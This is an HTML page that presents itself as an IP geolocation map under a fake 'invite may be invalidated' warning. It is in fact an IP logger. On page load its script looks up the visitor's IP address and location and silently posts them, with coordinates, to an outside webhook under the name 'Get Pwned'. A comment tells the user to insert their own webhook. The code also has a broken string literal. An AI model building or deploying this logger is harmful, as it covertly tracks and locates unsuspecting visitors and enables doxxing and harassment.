<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Geolocation Map</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: #f5f5f5;
      padding: 50px;
    }
    #map {
      width: 100%;
      height: 400px;
      margin-top: 20px;
    }
    .warning {
      color: red;
      font-weight: bold;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="warning">
    ‚ö†Ô∏è WARNING: Your invite may be invalidated if you leave!
  </div>

  <h1>Your IP & Location</h1>
  <div id="ip-info">Loading...</div>
  <iframe id="map" src="" frameborder="0"></iframe>

  <script>
    const webhookURL = "https://webhook-test.com/26eff05a1fb9bd13e113d9a93d51f174; // replace with your actual webhook

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        const { ip, city, region, country_name, latitude, longitude } = data;

        document.getElementById("ip-info").innerText = `IP: ${ip} ‚Äî Location: ${city}, ${region}, ${country_name}`;

        const map = document.getElementById("map");
        map.src = `https://maps.google.com/maps?q=${latitude},${longitude}&z=10&output=embed`;

        const payload = {
          username: "Get Pwned",
          content: `üìç New Visitor IP: ${ip}\nLocation: ${city}, ${region}, ${country_name}\nMap: https://maps.google.com/?q=${latitude},${longitude}`
        };

        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      })
      .catch(err => {
        document.getElementById("ip-info").innerText = "Failed to fetch IP info.";
        console.error(err);
      });
  </script>
</body>
</html>
